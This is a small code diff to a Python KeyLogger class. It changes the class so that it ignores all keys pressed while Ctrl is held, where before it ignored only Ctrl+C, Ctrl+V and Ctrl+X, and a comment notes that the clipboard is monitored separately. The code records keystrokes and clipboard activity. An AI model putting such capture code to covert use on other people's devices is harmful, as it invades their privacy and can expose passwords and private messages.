@@ -193,16 +193,16 @@ class KeyLogger:
                 self.alt_pressed = True
                 return
             
+            # Skip ALL keys when Ctrl is pressed (Ctrl + any key combinations)
+            if self.ctrl_pressed:
+                self.flush_special_key_count()
+                return
+            
             # Handle Enter key
             if key == keyboard.Key.enter:
                 self.flush_special_key_count()
                 self.write_to_buffer("\n[Enter]\n")
                 logger.debug("Enter key pressed - new line")
-                return
-            
-            # Handle Ctrl+C, Ctrl+V, Ctrl+X - Skip (clipboard monitored separately)
-            if self.ctrl_pressed and hasattr(key, 'char') and key.char in ('c', 'v', 'x'):
-                self.flush_special_key_count()
                 return
             
             # Convert key to string
